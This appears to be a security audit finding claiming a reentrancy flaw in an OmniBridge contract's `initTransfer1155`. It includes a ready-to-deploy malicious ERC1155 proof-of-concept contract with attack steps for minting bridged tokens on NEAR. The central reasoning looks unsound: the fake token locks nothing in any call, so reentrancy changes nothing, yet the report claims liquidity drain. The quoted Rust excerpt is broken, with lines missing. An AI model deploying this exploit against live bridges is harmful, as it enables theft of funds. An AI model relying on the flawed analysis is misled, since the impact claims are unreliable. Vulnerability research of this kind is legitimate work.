### Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 Token Allows Minting Unbacked Assets on NEAR - (File: evm/src/omni-bridge/contracts/OmniBridge.sol)

### Summary
`initTransfer1155` calls `IERC1155(tokenAddress).safeTransferFrom(...)` on an attacker-supplied, untrusted token address without a reentrancy guard. Because `currentOriginNonce` is a state variable read at the point of use (not captured into a local variable), a reentrant call during the external `safeTransferFrom` causes the outer call to emit an `InitTransfer` event with the same nonce as the inner call, while the inner call's event is emitted with zero actual tokens locked. NEAR processes the inner-call event and mints tokens against no EVM collateral.

### Finding Description

`initTransfer1155` increments `currentOriginNonce` at the top of the function, then immediately makes an external call to the user-supplied `tokenAddress`: [1](#0-0) 

The nonce increment happens at line 448, but `currentOriginNonce` is **read again by reference** at lines 471 and 483 when passed to `initTransferExtension` and `emit InitTransfer`. There is no local snapshot of the nonce.

A malicious ERC1155 token's `safeTransferFrom` can reenter `initTransfer1155` before returning:

**Outer call** (attacker-initiated):
1. `currentOriginNonce += 1` → N
2. `IERC1155(malicious).safeTransferFrom(...)` → **reenters**

**Inner call** (reentrant):
1. `currentOriginNonce += 1` → N+1
2. `IERC1155(malicious).safeTransferFrom(...)` → returns success, no tokens transferred
3. `initTransferExtension(..., currentOriginNonce=N+1, ...)`
4. `emit InitTransfer(..., nonce=N+1, ...)` ← **event emitted, 0 tokens locked**

**Outer call resumes**:
5. `initTransferExtension(..., currentOriginNonce=N+1, ...)` ← reads updated state variable
6. `emit InitTransfer(..., nonce=N+1, ...)` ← duplicate, NEAR rejects

The inner call's `InitTransfer` event (nonce N+1) is emitted with zero tokens actually locked in the bridge. NEAR's `fin_transfer_callback` processes this event as a legitimate proof from the registered EVM factory and releases tokens to the recipient.

The attacker can register the malicious ERC1155 token permissionlessly via `logMetadata1155`: [2](#0-1) 

The `onERC1155Received` guard on OmniBridge does not protect against this because a malicious ERC1155 token's `safeTransferFrom` is not required to call `onERC1155Received` at all — it can reenter `initTransfer1155` directly: [3](#0-2) 

The NEAR `fin_transfer_callback` verifies only that the event came from the registered factory and that the nonce is unused — both conditions are satisfied by the inner call's event: [4](#0-3) 

### Impact Explanation
**Critical.** An unprivileged attacker can mint an arbitrary amount of bridged ERC1155-backed tokens on NEAR without locking any EVM-side collateral. This creates unbacked supply on NEAR. The attacker can sell these tokens on NEAR DEXes or bridge them onward to Solana or StarkNet, draining protocol liquidity. This is a direct unauthorized mint of bridged assets.

### Likelihood Explanation
**Medium.** The attack requires:
1. Deploying a malicious ERC1155 contract (trivial, no permissions needed)
2. Calling `logMetadata1155` to register it (permissionless)
3. Waiting for NEAR to index the `LogMetadata` event
4. Calling `initTransfer1155` with the malicious token

No privileged access, leaked keys, or colluding operators are required. Any unprivileged bridge user can execute this.

### Recommendation
1. Add OpenZeppelin's `ReentrancyGuardUpgradeable` to `OmniBridge` and apply `nonReentrant` to `initTransfer1155` (and `initTransfer` for defense-in-depth).
2. Capture `currentOriginNonce` into a local variable immediately after incrementing it, and use only the local variable in subsequent `initTransferExtension` and `emit` calls — this prevents the nonce collision even if reentrancy occurs.

```solidity
function initTransfer1155(...) external payable nonReentrant whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;
    uint64 nonce = currentOriginNonce; // capture locally
    // ...
    IERC1155(tokenAddress).safeTransferFrom(...);
    // ...
    initTransferExtension(msg.sender, deterministicToken, nonce, ...);
    emit BridgeTypes.InitTransfer(msg.sender, deterministicToken, nonce, ...);
}
```

```solidity
pragma solidity ^0.8.24;

import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress, uint256 tokenId, uint128 amount,
        uint128 fee, uint128 nativeFee, string calldata recipient, string calldata message
    ) external payable;
    function logMetadata1155(address tokenAddress, uint256 tokenId) external payable;
}

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    bool public reentered;
    uint256 public tokenId = 1;

    constructor(address _bridge) { bridge = IOmniBridge(_bridge); }

    // Called by OmniBridge: safeTransferFrom(msg.sender, address(this), tokenId, amount, "")
    function safeTransferFrom(
        address, address, uint256, uint256, bytes calldata
    ) external {
        if (!reentered) {
            reentered = true;
            // Reenter: inner call increments nonce to N+1, emits InitTransfer(N+1), 0 tokens locked
            bridge.initTransfer1155(address(this), tokenId, 100, 0, 0, "near:attacker.near", "");
        }
        // Both calls return success without transferring any tokens
    }

    // Satisfy ERC1155 interface minimally
    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function name() external pure returns (string memory) { return "Malicious"; }
    function symbol() external pure returns (string memory) { return "MAL"; }
    function decimals() external pure returns (uint8) { return 18; }
}

// Attack steps:
// 1. Deploy MaliciousERC1155(bridgeAddress)
// 2. bridge.logMetadata1155(malicious, 1)  -- register token permissionlessly
// 3. Wait for NEAR to index LogMetadata event
// 4. bridge.initTransfer1155(malicious, 1, 100, 0, 0, "near:attacker.near", "")
//    -> inner reentrant call emits InitTransfer(nonce=N+1) with 0 tokens locked
//    -> NEAR processes it and mints 100 tokens to attacker.near
//    -> outer call emits duplicate InitTransfer(nonce=N+1), NEAR rejects as duplicate
// Result: attacker holds 100 minted NEAR tokens backed by 0 EVM collateral
```

```rust
        &mut self,

        require!(

                == Some(init_transfer.emitter_address),

        let decimals = self
            .token_decimals
            .get(&init_transfer.token)

            self.get_next_destination_nonce(init_transfer.recipient.get_chain());
        let transfer_message = TransferMessage {
            origin_nonce: init_transfer.origin_nonce,
            token: init_transfer.token,
            amount: Self::denormalize_amount(init_transfer.amount.0, decimals).into(),
            recipient: init_transfer.recipient,
            fee: Self::denormalize_fee(&init_transfer.fee, decimals),
            sender: init_transfer.sender,
            msg: init_transfer.msg,
            destination_nonce,
            origin_transfer_id: None,
        };

        if let OmniAddress::Near(recipient) = transfer_message.recipient.clone() {
            self.process_fin_transfer_to_near(
                recipient,
                &predecessor_account_id,
                transfer_message,
                storage_deposit_actions,
            )
            .into()
        } else {
            self.process_fin_transfer_to_other_chain(predecessor_account_id, transfer_message);
            PromiseOrValue::Value(destination_nonce)
        }
    }
```
